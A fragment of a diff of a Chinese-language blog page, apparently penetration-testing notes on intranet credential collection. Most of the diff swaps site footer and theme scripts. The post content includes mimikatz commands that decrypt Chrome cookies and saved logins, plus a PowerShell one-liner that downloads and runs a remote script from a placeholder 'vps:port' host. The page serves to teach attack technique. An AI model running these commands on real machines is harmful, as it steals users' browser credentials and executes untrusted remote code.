+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">%localappdata%\google\chrom\USERDA~1\dedault\LOGIND~1<br>%localappdata%\google\chrom\USERDA~1\dedault\cookies<br><br>chrom用户信息保存在本地为sqlite数据库格式<br><br>mimikatz.exe privilege::debug log &quot;dpapi::chrom/in:%localappdata%\google\chrom\USERDA~1\default\cookies /unprotect&quot; exit<br> <br>mimikatz.exe privilege::debug log &quot;dpapi::chrom/in:%localappdata%\google\chrom\USERDA~1\default\LOGIND~1&quot; exit<br></code></pre></td></tr></table></figure>
 </li>
 <li><p><strong>Powershell</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe IEX(new-object net.webclient).downloadstring(&#x27;http://vps:port/GEt-Information.ps1&#x27;);Get-Information</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">powershell.exe IEX(new-object net.webclient).downloadstring(&#x27;http://vps:port/GEt-Information.ps1&#x27;);Get-Information<br></code></pre></td></tr></table></figure>
 </li>
 </ol>
 </li>
 </ul>
-
-  </div>
-</article>
-
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/">Home</a></li>
-         
-          <li><a href="/about/">About</a></li>
-         
-          <li><a href="/archives/">Writing</a></li>
-         
-          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
-        
-      </ul>
-    </div>
-
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C"><span class="toc-number">1.</span> <span class="toc-text">内网信息收集二</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%AD%E8%AF%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">凭证信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">本地信息收集</span></a></li></ol></li></ol>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://racerz-fighting.github.io/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://racerz-fighting.github.io/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/&text=内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://racerz-fighting.github.io/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/&title=内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://racerz-fighting.github.io/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/&is_video=false&description=内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取&body=Check out this article: https://racerz-fighting.github.io/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://racerz-fighting.github.io/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/&title=内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://racerz-fighting.github.io/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/&title=内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://racerz-fighting.github.io/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/&title=内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://racerz-fighting.github.io/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/&title=内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://racerz-fighting.github.io/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/&name=内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://racerz-fighting.github.io/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/&t=内网渗透——信息收集—凭证信息获取&amp;&amp;本地历史信息获取"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
-</div>
-
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
-    
-    
-    2016-2023
-    RacerZ
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-        <!--
-       --><li><a href="/">Home</a></li><!--
-     --><!--
-       --><li><a href="/about/">About</a></li><!--
-     --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
-     --><!--
-       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
-     -->
-      </ul>
-    </nav>
-  </div>
-</footer>
-
-    </div>
-    <!-- styles -->
-
-
-
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
- 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
-
-
-
-
-<!-- clipboard -->
-
-  
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
-  
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
-    btn += '<i class="far fa-clone"></i>';
-    btn += '</span>'; 
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "Copied!");
-      e.clearSelection();
-    })
-  })
-  </script>
-
-
-<script src="/js/main.js"></script>
-
-<!-- search -->
-
-<!-- Google Analytics -->
-
-<!-- Baidu Analytics -->
-
-<!-- Cloudflare Analytics -->
-
-<!-- Umami Analytics -->
-
-<!-- Disqus Comments -->
-
-<!-- utterances Comments -->
-
-</body>
-</html>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/01/05/Hibernate%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">← Next Hibernate反序列化浅析</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/01/04/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/">南大《软件分析》课程笔记 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">RacerZ</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/RacerZ-fighting"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" href="qiyizhang2002@foxmail.com"><i class="fa fa-envelope" alt="E-Mail"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C"><span class="toc-number">1.</span> <span class="toc-text">内网信息收集二</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%AD%E8%AF%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">凭证信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">本地信息收集</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
